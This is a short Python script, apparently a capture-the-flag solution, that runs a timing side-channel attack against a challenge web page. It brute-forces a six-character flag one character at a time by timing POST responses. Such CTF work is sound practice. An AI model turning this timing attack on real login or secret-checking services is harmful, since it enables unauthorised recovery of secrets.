import time
import requests

url = "http://time-is-key.challs.olicyber.it/index.php"

flag_len = 6

charset = "abcdefghijklmnopqrstuvwxyz0123456789"

guessed_flag = ""

print("Starting timing attack to guess the flag...")

for i in range(flag_len):
    max_time = 0
    best_char = ""
    
    for char in charset:
        test_flag = guessed_flag + char + "A" * (flag_len - len(guessed_flag) - 1)
        data = {"flag": test_flag}
        
        start_time = time.time()
        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        elapsed_time = time.time() - start_time
        
        if elapsed_time > max_time:
            max_time = elapsed_time
            best_char = char
    
    guessed_flag += best_char
    print(f"Guessed so far: {guessed_flag}")

print(f"Guessed flag: {guessed_flag}")
